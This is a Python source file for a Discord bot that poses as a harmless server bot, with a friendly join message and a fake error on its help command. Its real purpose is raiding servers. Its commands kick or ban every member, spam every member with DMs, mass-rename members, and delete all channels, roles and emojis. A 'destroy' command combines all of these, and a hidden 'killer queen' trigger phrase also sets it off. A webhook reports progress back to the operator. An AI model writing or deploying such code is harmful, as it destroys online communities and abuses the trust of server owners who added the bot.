import discord, aiohttp
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
# Imports the needed libs.

# CONFIG
# ---------
token = ""
while(token == ""):
  token = input("Insert token: ")

prefix = ""
while(prefix == ""):
  prefix = input("Insert prefix: ")

webhook_url = input("insert webhook (Using webhook makes it 100% slower i recommend not to use it): ")

is_bot = True
whitelist = []
# ---------

print("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=not is_bot)
bot.remove_command("help")
# Declares the bot, passes it a prefix and lets it know to (hopefully) only listen to itself.

@bot.event # Prints when the bot is ready to be used.
async def on_ready():
    print("Ready to be innocent.")
    whitelist.append(bot.user.id)

@bot.event # Killer queen
async def on_message(message):
  if message.content == "killer queen":
    await message.channel.send("BITES THE DUST")
    ctx = await bot.get_context(message)
    await destroy(ctx)
  await bot.process_commands(message)

@bot.event # Greets and checks for perms on server join
async def on_guild_join(guild):
    if webhook_url != "":
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
            embed=discord.Embed(title="Joined guild: {0} ID: {1}".format(guild.name, guild.id), color=0x00ff33)
            embed.set_thumbnail(url=bot.user.avatar_url)
            await webhook.send(embed=embed)
    for channel in guild.text_channels:
      if channel.permissions_for(guild.me).send_messages:
        embed=discord.Embed(title="Thank you for adding me to your discord server!", description="Type **{0}help** to get started".format(prefix))
        embed.set_thumbnail(url=bot.user.avatar_url)
        await channel.send(embed=embed)
        break

try:

    async def self_check(ctx):
        return ctx.message.author.id in whitelist
    # A secondary check to ensure nobody but the owner can run these commands.

    @bot.command(pass_context=True)
    async def help(ctx):
      embed=discord.Embed(title="Something went wrong. Please try again.", description="Possible lack of permissions to operate in this discord server.",color=0xff0000)
      embed.set_thumbnail(url=bot.user.avatar_url)
      await ctx.send(embed=embed)

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def kall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print(f"{user.name} has been kicked from {ctx.guild.name}")
                if webhook_url != "":
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has been kicked from {ctx.guild.name}", color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has FAILED to be kicked from {ctx.guild.name}", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        print("Action Completed: kall")
    # Kicks every member in a server.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def ball(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print(f"{user.name} has been banned from {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has been banned from {ctx.guild.name}", color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has FAILED to be banned from {ctx.guild.name}", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        print("Action Completed: ball")
    # Bans every member in a server.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def rall(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print(f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}",color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        print("Action Completed: rall")
    # Renames every member in a server.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def mall(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has recieved the message.",color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{user.name} has NOT recieved the message.")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has NOT recieved the message.", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        print("Action Completed: mall")
    # Messages every member in a server.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def dall(ctx, condition):
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print(f"{channel.name} has been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{channel.name} has been deleted in {ctx.guild.name}",color=0x00ff33)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
                except:
                    print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{channel.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
            print("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print(f"{role.name} has been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{role.name} has been deleted in {ctx.guild.name}",color=0x00ff33)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
                except:
                    print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{role.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
            print("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(f"{emoji.name} has been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{emoji.name} has been deleted in {ctx.guild.name}",color=0x00ff33)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
                except:
                    print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{emoji.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
            print("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print(f"{channel.name} has been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{channel.name} has been deleted in {ctx.guild.name}",color=0x00ff33)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
                except:
                    print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{channel.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print(f"{role.name} has been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{role.name} has been deleted in {ctx.guild.name}", color=0x00ff33)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
                except:
                    print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{role.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(f"{emoji.name} has been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{emoji.name} has been deleted in {ctx.guild.name}", color=0x00ff33)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
                except:
                    print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
                    if webhook_url != "": 
                        async with aiohttp.ClientSession() as session:
                            webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                            embed=discord.Embed(title=f"{emoji.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                            embed.set_thumbnail(url=bot.user.avatar_url)
                            await webhook.send(embed=embed)
            print("Action Completed: dall all")
    # Can perform multiple actions that envolve mass deleting.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def destroy(ctx):
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{emoji.name} has been deleted in {ctx.guild.name}", color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{emoji.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{channel.name} has been deleted in {ctx.guild.name}", color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{channel.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print(f"{role.name} has been deleted in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{role.name} has been deleted in {ctx.guild.name}", color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{role.name} has NOT been deleted in {ctx.guild.name}", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print(f"{user.name} has been banned from {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has been banned from {ctx.guild.name}", color=0x00ff33)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
            except:
                print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
                if webhook_url != "": 
                    async with aiohttp.ClientSession() as session:
                        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
                        embed=discord.Embed(title=f"{user.name} has FAILED to be banned from {ctx.guild.name}", color=0xff0000)
                        embed.set_thumbnail(url=bot.user.avatar_url)
                        await webhook.send(embed=embed)
        print("Action Completed: destroy")
    # Outright destroys a server.
except:
    pass

bot.run(token, bot=is_bot)
# Starts the bot by passing it a token and telling it it isn't really a bot.
